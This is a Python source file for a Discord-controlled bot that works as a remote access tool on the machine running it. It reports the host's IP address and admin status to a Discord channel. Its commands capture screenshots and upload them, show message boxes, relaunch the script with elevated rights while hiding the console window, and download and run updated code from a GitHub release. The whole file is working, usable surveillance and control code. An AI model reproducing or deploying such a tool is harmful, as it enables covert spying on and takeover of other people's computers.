import discord
import asyncio
import socket
import os
import getpass
import aiohttp
import zipfile
import shutil
import sys
import time
import ctypes
import threading
import json
import uuid
import subprocess
import pyautogui

# Configuration file path
CONFIG_FILE_PATH = 'config.json'

# Global variables to store the channel ID and bot token
channel_id = None
TOKEN = None
session_id = None

# Command prefix
PREFIX = '!'

intents = discord.Intents.default()
intents.message_content = True  # Enable message content intents
client = discord.Client(intents=intents)

async def get_or_create_channel(guild):
  """Check for existing channel ID in config file or create a new session channel."""
  global channel_id, TOKEN
  if os.path.exists(CONFIG_FILE_PATH):
    with open(CONFIG_FILE_PATH, 'r') as config_file:
      config = json.load(config_file)
      channel_id = config.get('channel_id')
      TOKEN = config.get('TOKEN')
      if channel_id:
        channel = guild.get_channel(channel_id)
        if channel:
          return channel

  # Determine the lowest available session number
  session_number = 1
  existing_channels = [channel.name for channel in guild.channels]
  while f'session-{session_number}' in existing_channels:
    session_number += 1

  # Check if the "Sessions" category exists, create if it doesn't
  category = discord.utils.get(guild.categories, name="Sessions")
  if category is None:
    category = await guild.create_category("Sessions")

  # Create a new channel under the "Sessions" category
  new_channel = await guild.create_text_channel(f'session-{session_number}', category=category)

  # Write the new channel ID and bot token to the configuration file
  channel_id = new_channel.id
  with open(CONFIG_FILE_PATH, 'w') as config_file:
    json.dump({'channel_id': channel_id, 'TOKEN': TOKEN, 'session_id': session_id}, config_file)

  return new_channel

async def send_session_message(channel):
  """Send a session message to the specified channel."""
  # Get the IP address of the machine
  hostname = socket.gethostname()
  ip_address = socket.gethostbyname(hostname)

  # Check if the script is running with admin privileges
  is_admin = os.getuid() == 0 if os.name != 'nt' else os.system("net session >nul 2>&1") == 0

  # Create the embed message
  embed = discord.Embed(title="New Session Enabled! 👋", color=0x00ff00)
  embed.add_field(name="IP Address", value=f"```{ip_address}```", inline=False)
  embed.add_field(name="Admin Privileges", value="Yes" if is_admin else "No", inline=False)

  # Send the embed message to the channel
  await channel.send(embed=embed)

async def handle_hello_command(message):
  """Handles the hello command."""
  await message.channel.send('Hello! How can I assist you today?')

async def handle_status_command(message):
  """Handles the status command."""
  # Check if the bot is running with admin privileges
  is_admin = os.getuid() == 0 if os.name != 'nt' else os.system("net session >nul 2>&1") == 0

  # Create the status message
  status_message = f"Bot is running and ready to assist!\nAdmin Privileges: {'Yes' if is_admin else 'No'}"

  await message.channel.send(status_message)

async def handle_help_command(message):
  """Handles the help command."""
  embed = discord.Embed(title="Help - Command List", color=0x00ff00)
  for command, func in command_handlers.items():
    embed.add_field(name=f"!{command}", value=func.__doc__, inline=False)
  await message.channel.send(embed=embed)

async def handle_unknown_command(message):
  """Handles unknown commands."""
  await message.channel.send('I did not understand that command.')

async def handle_update_command(message):
  """Handles the update command."""
  await message.channel.send('Updating the bot...')

  # Save important information to the config file
  save_config()

  # Download the latest release from GitHub
  if await download_latest_release():
    # Restart the bot with the new script
    restart_bot()
  else:
    await message.channel.send('Failed to download the latest release.')

async def download_latest_release():
  """Download the latest release of the bot from GitHub."""
  releases_url = 'https://api.github.com/repos/Blast0ff/Rafly/releases/latest'
  print(f"Fetching latest release info from {releases_url}")

  async with aiohttp.ClientSession() as session:
    async with session.get(releases_url) as response:
      if response.status == 200:
        release_info = await response.json()
        zip_url = release_info['zipball_url']
        zip_path = os.path.join(script_dir, 'bot.zip')
        print(f"Downloading latest release from {zip_url}")

        async with session.get(zip_url) as zip_response:
          if zip_response.status == 200:
            print("Download successful, saving to file.")
            with open(zip_path, 'wb') as file:
              file.write(await zip_response.read())

            try:
              print("Extracting zip file.")
              with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(script_dir)
              os.remove(zip_path)
              print("Extraction successful.")
              return True
            except zipfile.BadZipFile:
              print("Bad zip file, removing.")
              os.remove(zip_path)
              return False
          else:
            print(f"Failed to download file, status code: {zip_response.status}")
            return False
      else:
        print(f"Failed to fetch release info, status code: {response.status}")
        return False

def show_message_box(content):
  """Displays a message box on the PC running the bot with the provided content."""
  ctypes.windll.user32.MessageBoxW(0, content, "Message Box", 1)

async def handle_message_box_command(message):
  """Handles the 'message box' command."""
  # Ask the user for the message box content
  await message.channel.send("Please provide the content for the message box:")
  
  def check(m):
    return m.author == message.author and m.channel == message.channel

  try:
    # Wait for the user's response
    response = await client.wait_for('message', check=check, timeout=60.0)
    content = response.content

    # Run the show_message_box function in a separate thread with the provided content
    threading.Thread(target=show_message_box, args=(content,)).start()
    
    # Send the message immediately without waiting for the message box to be dismissed
    await message.channel.send("Message box displayed on the PC!")
  except asyncio.TimeoutError:
    await message.channel.send("You took too long to provide the content for the message box.")

def take_screenshot():
    """Take a screenshot and save it to a file."""
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

async def handle_screenshot_command(message):
    """Handles the screenshot command."""
    take_screenshot()
    await message.channel.send(file=discord.File('screenshot.png'))

def uac():
    """Request admin privileges using UAC."""
    if ctypes.windll.shell32.IsUserAnAdmin():
        print("Already running as admin.")
        return True
    else:
        print("Requesting admin privileges...")
        # Hide the console window
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        # Re-run the script with admin privileges and hidden console
        params = ' '.join([f'"{param}"' for param in sys.argv])
        command = f'Start-Process -FilePath "{sys.executable}" -ArgumentList @({params}) -Verb runAs -WindowStyle Hidden'
        try:
            subprocess.run(['powershell', '-Command', command], check=True)
            return True
        except subprocess.CalledProcessError:
            return False

async def handle_uac_command(message):
    """Handles the uac command to request admin privileges."""
    await message.channel.send('Requesting admin privileges...')
    if uac():
        await message.channel.send('Admin privileges granted.')
        sys.exit()  # Exit the current instance to prevent multiple instances
    else:
        await message.channel.send('Admin privileges denied.')

def save_config():
  """Save important information to the config file."""
  with open(CONFIG_FILE_PATH, 'w') as config_file:
    json.dump({'channel_id': channel_id, 'TOKEN': TOKEN, 'session_id': session_id}, config_file)

def prompt_for_token():
  """Prompt the user to input the bot token if it doesn't exist in the config file."""
  global TOKEN
  TOKEN = input("Please enter your bot token: ")
  save_config()

def restart_bot():
  """Restart the bot by closing the script and starting it up again."""
  print("Restarting bot...")
  os.execv(sys.executable, [sys.executable] + sys.argv)

async def handle_restart_command(message):
  """Handles the restart command."""
  await message.channel.send('Restarting bot...')
  restart_bot()

async def handle_exit_command(message):
  """Handles the exit command."""
  await message.channel.send('Shutting down...')
  await client.close()

# Dictionary to map commands to their corresponding handler functions
command_handlers = {
  'hello': handle_hello_command,
  'status': handle_status_command,
  'help': handle_help_command,
  'update client': handle_update_command,
  'message box': handle_message_box_command,
  'screenshot': handle_screenshot_command,
  'uac': handle_uac_command,
  'restart bot': handle_restart_command,
  'exit': handle_exit_command,
}

def check_existing_session():
  """Check if there is an existing session."""
  if os.path.exists(CONFIG_FILE_PATH):
    with open(CONFIG_FILE_PATH, 'r') as file:
      config = json.load(file)
      if 'session_id' in config:
        return True
  return False

@client.event
async def on_ready():
  """Handles the bot being ready."""
  print(f'Logged in as {client.user.name}')
  
  guild = discord.utils.get(client.guilds)
  channel = await get_or_create_channel(guild)

  # Check for an existing session
  if check_existing_session():
    await channel.send("Session online")
  else:
    # Send the session message to the channel
    await send_session_message(channel)
    # Create a new session ID and save it to the config file
    global session_id
    session_id = str(uuid.uuid4())
    with open(CONFIG_FILE_PATH, 'w') as config_file:
      json.dump({'session_id': session_id, 'channel_id': channel_id, 'TOKEN': TOKEN}, config_file)

@client.event
async def on_message(message):
  """Handles incoming messages."""
  global channel_id

  # Ignore messages from the bot itself
  if message.author == client.user:
    return

  # Check if the message is in the specific channel
  if message.channel.id == channel_id:
    # Check if the message starts with the prefix
    if message.content.startswith(PREFIX):
      # Remove the prefix and split the message into command and arguments
      command = message.content[len(PREFIX):].strip().lower()

      # Get the command handler from the dictionary and execute it
      handler = command_handlers.get(command)
      if handler:
        await handler(message)
      else:
        await handle_unknown_command(message)

# Read the bot token from the config file if it exists
if os.path.exists(CONFIG_FILE_PATH):
  with open(CONFIG_FILE_PATH, 'r') as config_file:
    config = json.load(config_file)
    channel_id = config.get('channel_id')
    TOKEN = config.get('TOKEN')
    session_id = config.get('session_id')

# Prompt for the token if it wasn't found in the config file
if not TOKEN:
  prompt_for_token()

# Ensure the TOKEN is not None before running the bot
if TOKEN:
  try:
    client.run(TOKEN)
  except Exception as e:
    print(f"Error running the bot: {e}")
else:
  print("Bot token is not set. Please check the configuration file.")